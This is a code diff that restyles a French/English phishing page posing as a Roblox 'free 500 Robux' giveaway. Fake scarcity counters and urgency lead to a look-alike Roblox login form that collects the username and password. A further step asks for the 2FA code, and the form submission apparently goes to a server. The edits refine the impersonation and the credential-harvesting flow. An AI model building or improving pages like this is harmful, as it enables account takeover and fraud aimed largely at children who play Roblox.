@@ -6,7 +6,7 @@
     <title>Roblox - Free Robux</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
     <style>
         * {
@@ -17,7 +17,7 @@
 
         body {
             font-family: 'Inter', -apple-system, sans-serif;
-            background: #f0f4f8;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -33,9 +33,10 @@
             margin: 0 auto;
             background: #ffffff;
             border-radius: 24px;
-            padding: 24px 24px 36px 24px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06);
+            padding: 32px 28px 36px 28px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
             position: relative;
+            min-height: 480px;
         }
 
         /* ============================================================
@@ -51,7 +52,7 @@
 
         .back-arrow {
             position: absolute;
-            left: -4px;
+            left: -6px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
@@ -70,52 +71,31 @@
 
         .back-arrow i {
             font-size: 18px;
-            color: #1a1a1a;
         }
 
         .header h1 {
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 16px;
+            font-weight: 500;
             color: #1a1a1a;
+            letter-spacing: -0.2px;
         }
 
         /* ============================================================
-           LOGO ROBLOX (avec "o" carré)
+           LOGO ROBLOX (style minimaliste)
            ============================================================ */
         .roblox-logo {
             text-align: center;
-            font-size: 38px;
+            font-size: 36px;
             font-weight: 900;
             letter-spacing: -1px;
             margin-bottom: 8px;
             font-family: 'Inter', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0;
-        }
-
-        .roblox-logo .rob {
             color: #1a1a1a;
+            padding: 8px 0;
         }
 
-        .roblox-logo .lox {
+        .roblox-logo .highlight {
             color: #00b2ff;
-        }
-
-        .roblox-logo .square-o {
-            display: inline-block;
-            background: #00b2ff;
-            color: #ffffff;
-            width: 28px;
-            height: 32px;
-            line-height: 32px;
-            text-align: center;
-            font-weight: 900;
-            font-size: 26px;
-            border-radius: 4px;
-            margin: 0 1px;
-            transform: translateY(-4px);
         }
 
         /* ============================================================
@@ -123,7 +103,7 @@
            ============================================================ */
         .step {
             display: none;
-            animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.35s ease;
         }
 
         .step.active {
@@ -131,32 +111,20 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         /* ============================================================
-           ÉTAPE 1 : OFFRE ROBUX
+           ÉTAPE 1 : OFFRE
            ============================================================ */
-        .offer-badge {
-            display: inline-block;
-            background: #e8f4fd;
-            color: #0066cc;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 4px 14px;
-            border-radius: 20px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-
         .offer-title {
-            font-size: 26px;
-            font-weight: 900;
+            font-size: 22px;
+            font-weight: 800;
             color: #1a1a1a;
-            line-height: 1.2;
+            text-align: center;
             margin-bottom: 4px;
+            line-height: 1.3;
         }
 
         .offer-title .highlight {
@@ -166,8 +134,38 @@
         .offer-subtitle {
             font-size: 14px;
             color: #777;
+            text-align: center;
             margin-bottom: 20px;
             line-height: 1.5;
+        }
+
+        .offer-box {
+            background: linear-gradient(145deg, #0b1f2e, #162b3e);
+            border-radius: 16px;
+            padding: 20px 16px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .offer-box .big-icon {
+            font-size: 34px;
+        }
+
+        .offer-box .big-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #ffffff;
+            margin-top: 2px;
+        }
+
+        .offer-box .big-title .highlight {
+            color: #00b2ff;
+        }
+
+        .offer-box .big-desc {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 4px;
         }
 
         .offer-stats {
@@ -175,7 +173,7 @@
             justify-content: space-between;
             background: #f7f8fa;
             border-radius: 12px;
-            padding: 12px 16px;
+            padding: 10px 16px;
             margin-bottom: 20px;
         }
 
@@ -184,7 +182,7 @@
         }
 
         .offer-stats .stat .number {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
             color: #1a1a1a;
         }
@@ -201,41 +199,87 @@
             margin-top: 2px;
         }
 
-        .offer-box {
-            background: linear-gradient(145deg, #0b1f2e, #162b3e);
-            border-radius: 16px;
-            padding: 20px 16px;
-            text-align: center;
-            margin-bottom: 18px;
+        /* ============================================================
+           INPUT STYLE (comme sur l'image)
+           ============================================================ */
+        .input-group {
+            margin-bottom: 16px;
         }
 
-        .offer-box .big-icon {
-            font-size: 38px;
-            margin-bottom: 2px;
+        .input-group label {
+            display: none;
         }
 
-        .offer-box .big-title {
-            font-size: 20px;
-            font-weight: 900;
-            color: #ffffff;
+        .input-group input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            background: #f7f8fa;
+            color: #1a1a1a;
+            transition: all 0.3s ease;
         }
 
-        .offer-box .big-title .highlight {
-            color: #00b2ff;
+        .input-group input::placeholder {
+            color: #b0b0b0;
+            font-weight: 400;
         }
 
-        .offer-box .big-desc {
+        .input-group input:focus {
+            border-color: #00b2ff;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.06);
+        }
+
+        .input-group input.input-error {
+            border-color: #ff3b30;
+            background: #fff5f5;
+        }
+
+        .input-group .password-wrapper {
+            position: relative;
+        }
+
+        .input-group .password-wrapper input {
+            padding-right: 48px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #b0b0b0;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .password-toggle:hover {
+            color: #1a1a1a;
+        }
+
+        .error-message {
+            color: #ff3b30;
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.7);
-            margin-top: 4px;
+            font-weight: 400;
+            margin-top: 6px;
+            display: none;
         }
 
+        /* ============================================================
+           BOUTON CONTINUE (style Roblox)
+           ============================================================ */
         .btn-primary {
             width: 100%;
             background: #00b2ff;
             color: #ffffff;
             border: none;
-            padding: 15px;
+            padding: 16px;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
@@ -243,11 +287,12 @@
             transition: all 0.3s ease;
             font-family: 'Inter', sans-serif;
             box-shadow: 0 4px 16px rgba(0, 178, 255, 0.3);
+            margin-top: 4px;
         }
 
         .btn-primary:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 6px 24px rgba(0, 178, 255, 0.4);
+            transform: scale(1.01);
+            box-shadow: 0 6px 20px rgba(0, 178, 255, 0.35);
         }
 
         .btn-primary:active:not(:disabled) {
@@ -260,217 +305,50 @@
             transform: none;
         }
 
-        .btn-primary i {
-            margin-right: 8px;
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .footer-note {
             font-size: 11px;
-            color: #aaa;
-            text-align: center;
-            margin-top: 12px;
-        }
-
-        /* ============================================================
-           ÉTAPE 2 : CONNEXION (style Roblox)
-           ============================================================ */
-        .login-header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .login-header p {
-            font-size: 14px;
-            color: #777;
-            margin-top: 4px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-            position: relative;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #777;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 6px;
-        }
-
-        .input-group .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
-        .input-group .input-wrapper .input-icon {
-            position: absolute;
-            left: 14px;
-            color: #b0b0b0;
-            font-size: 16px;
-            z-index: 1;
-        }
-
-        .input-group .input-wrapper input {
-            width: 100%;
-            padding: 14px 16px 14px 44px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-            background-color: #f7f8fa;
-            color: #1a1a1a;
-            transition: all 0.3s ease;
-        }
-
-        .input-group .input-wrapper input:focus {
-            border-color: #00b2ff;
-            background-color: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.08);
-        }
-
-        .input-group .input-wrapper input::placeholder {
-            color: #b0b0b0;
-            font-weight: 400;
-        }
-
-        .input-group .input-wrapper input.password-field {
-            padding-right: 48px;
-        }
-
-        .input-group .input-wrapper input.input-error {
-            border-color: #ff3b30;
-            background-color: #fff5f5;
-        }
-
-        .error-message {
-            color: #ff3b30;
-            font-size: 12px;
-            font-weight: 400;
-            margin-top: 6px;
-            display: none;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .error-message::before {
-            content: "⚠️";
-            font-size: 12px;
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #b0b0b0;
-            font-size: 18px;
-            cursor: pointer;
-            padding: 4px;
-        }
-
-        .password-toggle:hover {
-            color: #1a1a1a;
-        }
-
-        .separator {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            color: #b0b0b0;
-            font-size: 12px;
-            font-weight: 500;
-            margin: 12px 0 16px 0;
-        }
-
-        .separator::before,
-        .separator::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .separator span {
-            padding: 0 14px;
-        }
-
-        .btn-google {
-            background: #ffffff;
-            color: #1a1a1a;
-            border: 1.5px solid #e0e0e0;
-            padding: 13px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 500;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .btn-google:hover {
-            background: #f7f8fa;
-            border-color: #b0b0b0;
-        }
-
-        .btn-google svg {
-            width: 18px;
-            height: 18px;
-            flex-shrink: 0;
-        }
-
-        .forgot-links {
+            color: #bbb;
             text-align: center;
             margin-top: 14px;
-            font-size: 13px;
-        }
-
-        .forgot-links a {
-            color: #00b2ff;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .forgot-links a:hover {
-            text-decoration: underline;
-        }
-
-        .forgot-links .sep {
-            color: #e0e0e0;
-            margin: 0 8px;
         }
 
         /* ============================================================
-           ÉTAPE 3 : CODE 2FA
+           ÉTAPE 3 : 2FA
            ============================================================ */
         .verification-info {
-            background: #f7f8fa;
-            border-radius: 12px;
-            padding: 16px 20px;
-            margin-bottom: 20px;
             text-align: center;
-        }
-
-        .verification-info .label {
             font-size: 14px;
             color: #777;
+            margin-bottom: 20px;
         }
 
         .code-input-group {
             display: flex;
             gap: 10px;
             justify-content: center;
-            margin: 20px 0;
+            margin: 16px 0 20px 0;
         }
 
         .code-input-group input {
@@ -480,7 +358,7 @@
             font-size: 22px;
             font-weight: 600;
             font-family: 'Inter', sans-serif;
-            border: 2px solid #e0e0e0;
+            border: 1.5px solid #e0e0e0;
             border-radius: 12px;
             outline: none;
             background: #f7f8fa;
@@ -490,7 +368,7 @@
         .code-input-group input:focus {
             border-color: #00b2ff;
             background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.08);
+            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.06);
         }
 
         .code-error {
@@ -504,7 +382,7 @@
             text-align: center;
             font-size: 13px;
             color: #777;
-            margin: 12px 0 20px 0;
+            margin: 12px 0 16px 0;
         }
 
         .resend-link a {
@@ -540,12 +418,11 @@
         }
 
         .loading-logo {
-            font-size: 44px;
+            font-size: 40px;
             font-weight: 900;
             color: #ffffff;
-            letter-spacing: -1px;
             font-family: 'Inter', sans-serif;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
 
         .loading-logo span {
@@ -554,7 +431,7 @@
 
         .loading-text {
             color: #ffffff;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 500;
             margin-bottom: 16px;
             font-family: 'Inter', sans-serif;
@@ -603,7 +480,7 @@
             width: 300px;
             max-width: 90%;
             text-align: center;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.15);
             animation: slideUp 0.3s ease;
         }
 
@@ -621,7 +498,7 @@
         .geolocation-modal h3 {
             font-size: 17px;
             color: #1a1a1a;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
             font-weight: 600;
             font-family: 'Inter', sans-serif;
         }
@@ -674,12 +551,11 @@
            RESPONSIVE
            ============================================================ */
         @media (max-width: 420px) {
-            .container { padding: 16px 16px 28px 16px; }
-            .offer-title { font-size: 22px; }
-            .roblox-logo { font-size: 30px; }
-            .roblox-logo .square-o { width: 22px; height: 26px; line-height: 26px; font-size: 20px; }
+            .container { padding: 20px 16px 28px 16px; }
+            .roblox-logo { font-size: 28px; }
+            .offer-title { font-size: 19px; }
             .code-input-group input { width: 40px; height: 48px; font-size: 18px; }
-            .btn-primary { font-size: 15px; padding: 13px; }
+            .btn-primary { font-size: 15px; padding: 14px; }
         }
     </style>
 </head>
@@ -698,23 +574,18 @@
         </div>
 
         <!-- ============================================================
-        LOGO ROBLOX (avec "o" carré)
+        LOGO
         ============================================================ -->
         <div class="roblox-logo">
-            <span class="rob">Rob</span>
-            <span class="square-o">o</span>
-            <span class="lox">lox</span>
+            RO<span class="highlight">BLOX</span>
         </div>
 
         <!-- ============================================================
-        ÉTAPE 1 : OFFRE ROBUX
+        ÉTAPE 1 : OFFRE
         ============================================================ -->
         <div id="step1" class="step active">
-            <div style="text-align: center; margin-bottom: 4px;">
-                <span class="offer-badge">🎁 Offre spéciale</span>
-            </div>
             <h2 class="offer-title">
-                Gagne <span class="highlight">500 Robux</span>
+                🎁 <span class="highlight">500 Robux</span> gratuits
             </h2>
             <p class="offer-subtitle">
                 Pour fêter la rentrée, Roblox offre 500 Robux aux 10 000 premiers joueurs.
@@ -723,7 +594,7 @@
             <div class="offer-stats">
                 <div class="stat">
                     <div class="number">10 000</div>
-                    <div class="label">Places totales</div>
+                    <div class="label">Places</div>
                 </div>
                 <div class="stat">
                     <div class="number"><span class="robux" id="remainingPlaces">7 843</span></div>
@@ -731,49 +602,43 @@
                 </div>
                 <div class="stat">
                     <div class="number">⏳ 24h</div>
-                    <div class="label">Temps restant</div>
+                    <div class="label">Restant</div>
                 </div>
             </div>
 
             <div class="offer-box">
                 <div class="big-icon">🎁</div>
                 <div class="big-title">
-                    <span class="highlight">500</span> Robux <span style="color:#fff;">R$</span>
+                    <span class="highlight">500</span> Robux
                 </div>
-                <div class="big-desc">Gratuits · 100% vérifié · Offre limitée</div>
+                <div class="big-desc">Gratuits · Offre limitée · 100% vérifié</div>
             </div>
 
             <button class="btn-primary" id="btnOffer">
                 <i class="fas fa-gift"></i> Réclamer mes Robux
             </button>
-            <div class="footer-note">🔒 Aucune carte bancaire requise · 100% gratuit</div>
+            <div class="footer-note">🔒 Aucune carte bancaire requise</div>
         </div>
 
         <!-- ============================================================
-        ÉTAPE 2 : CONNEXION
+        ÉTAPE 2 : CONNEXION (style minimaliste)
         ============================================================ -->
         <div id="step2" class="step">
-            <div class="login-header">
-                <p>Connecte-toi pour recevoir tes 500 Robux</p>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <p style="font-size: 14px; color: #777; margin-bottom: 4px;">
+                    Enter your Roblox username to start getting free Robux
+                </p>
             </div>
 
             <form class="login-form" id="loginForm">
                 <div class="input-group">
-                    <label for="username">NOM D'UTILISATEUR OU E-MAIL</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon"><i class="fas fa-user"></i></span>
-                        <input type="text" id="username" placeholder="exemple@gmail.com ou pseudo" />
-                    </div>
-                    <div id="emailError" class="error-message">
-                        Veuillez entrer un nom d'utilisateur ou un email valide.
-                    </div>
+                    <input type="text" id="username" placeholder="Type your username ..." autofocus />
+                    <div id="emailError" class="error-message">Veuillez entrer un nom d'utilisateur ou email valide.</div>
                 </div>
 
                 <div class="input-group">
-                    <label for="password">MOT DE PASSE</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon"><i class="fas fa-lock"></i></span>
-                        <input type="password" id="password" class="password-field" placeholder="••••••••" />
+                    <div class="password-wrapper">
+                        <input type="password" id="password" placeholder="Enter your password ..." />
                         <button type="button" class="password-toggle" id="togglePassword">
                             <i class="fas fa-eye eye-icon" id="eyeIcon"></i>
                         </button>
@@ -782,37 +647,25 @@
 
                 <button type="submit" class="btn-primary" id="step2Btn">
                     <span class="btn-content">
-                        <span id="btnText2">Continuer</span>
+                        <span id="btnText2">Continue</span>
                         <span class="spinner" id="spinner2"></span>
                     </span>
                 </button>
-
-                <div class="forgot-links">
-                    <a href="#">Mot de passe oublié ?</a>
-                    <span class="sep">·</span>
-                    <a href="#">S'inscrire</a>
-                </div>
-
-                <div class="separator"><span>ou</span></div>
-
-                <button class="btn-google" onclick="loginWithGoogle()">
-                    <svg viewBox="0 0 24 24">
-                        <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.69c-.29 1.5-1.14 2.77-2.4 3.61v3h3.84c2.25-2.07 3.61-5.12 3.61-8.46z"/>
-                        <path fill="#34A853" d="M12 24c3.24 0 5.97-1.08 7.96-2.91l-3.84-3c-1.06.72-2.42 1.16-4.12 1.16-3.17 0-5.85-2.14-6.81-5.02H1.24v3.1A11.997 11.997 0 0012 24z"/>
-                        <path fill="#FBBC05" d="M5.19 14.23c-.25-.72-.39-1.5-.39-2.23s.14-1.51.39-2.23V6.67H1.24A11.997 11.997 0 000 12c0 1.92.45 3.74 1.24 5.33l3.95-3.1z"/>
-                        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.44-3.44C17.96 1.19 15.24 0 12 0 7.33 0 3.28 2.67 1.24 6.67l3.95 3.1c.96-2.88 3.64-5.02 6.81-5.02z"/>
-                    </svg>
-                    Continuer avec Google
-                </button>
             </form>
+
+            <div style="text-align: center; margin-top: 16px; font-size: 13px; color: #999;">
+                <a href="#" style="color: #00b2ff; text-decoration: none; font-weight: 500;">Forgot password?</a>
+                <span style="color: #ddd; margin: 0 8px;">·</span>
+                <a href="#" style="color: #00b2ff; text-decoration: none; font-weight: 500;">Sign up</a>
+            </div>
         </div>
 
         <!-- ============================================================
-        ÉTAPE 3 : CODE 2FA
+        ÉTAPE 3 : 2FA
         ============================================================ -->
         <div id="step3" class="step">
             <div class="verification-info">
-                <div class="label">Un code de vérification vous a été envoyé.</div>
+                Un code de vérification vous a été envoyé.
             </div>
 
             <div class="code-input-group" id="codeInputs">
@@ -858,7 +711,7 @@
     LOADING
     ============================================================ -->
     <div id="loading-page">
-        <div class="loading-logo">Rob<span>lox</span></div>
+        <div class="loading-logo">RO<span style="color:#0b1f2e;">BLOX</span></div>
         <div class="loading-text">Connexion en cours...</div>
         <div class="progress-bar">
             <div class="progress" id="progress-bar"></div>
@@ -940,12 +793,12 @@
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             document.getElementById('pageTitle').textContent = 'Connexion';
-            // Simuler une diminution des places
             const places = document.getElementById('remainingPlaces');
             let current = parseInt(places.textContent.replace(/\s/g, ''));
             if (current > 0) {
                 places.textContent = (current - 1).toLocaleString();
             }
+            document.getElementById('username').focus();
         });
 
         // ============================================================
@@ -1056,13 +909,6 @@
         }
 
         // ============================================================
-        // FONCTIONS
-        // ============================================================
-        function loginWithGoogle() {
-            alert('Pour des raisons de sécurité, veuillez utiliser votre nom d\'utilisateur ou email.');
-        }
-
-        // ============================================================
         // ÉTAPE 2 : SOUMISSION
         // ============================================================
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
@@ -1073,7 +919,7 @@
 
             if (!isValidUsernameOrEmail(username)) {
                 document.getElementById('username').classList.add('input-error');
-                document.getElementById('emailError').style.display = 'flex';
+                document.getElementById('emailError').style.display = 'block';
                 return;
             }
 
@@ -1123,7 +969,7 @@
                 alert('Erreur de connexion au serveur.');
             } finally {
                 btn.disabled = false;
-                btnText.textContent = 'Continuer';
+                btnText.textContent = 'Continue';
                 spinner.style.display = 'none';
             }
         });
